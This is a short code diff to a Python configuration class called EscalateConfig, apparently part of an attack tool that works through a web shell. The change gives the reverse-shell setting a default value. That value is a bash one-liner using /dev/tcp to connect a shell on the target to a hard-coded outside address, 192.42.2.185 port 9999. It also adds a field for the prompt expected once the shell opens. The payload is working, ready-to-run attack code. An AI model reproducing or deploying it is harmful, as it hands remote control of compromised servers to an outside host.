@@ -8,6 +8,7 @@ from ipaddress import (
 )
 from typing import (
     List,
+    Optional,
     Pattern,
     Union,
 )
@@ -162,8 +163,17 @@ class EscalateConfig(BaseModel):
     )
 
     reverse_cmd: List[str] = Field(
-        ...,
+        [
+            "bash",
+            "-c",
+            "'0<&196;exec 196<>/dev/tcp/192.42.2.185/9999; sh <&196 >&196 2>&196'",
+        ],
         description="The command to execute via the web shell to establish a reverse shell",
+    )
+
+    reverse_prompts_expect: Optional[Pattern] = Field(
+        None,
+        description="The prompt to expect after opening the reverse shell",
     )
 
     reverse_port: int = Field(
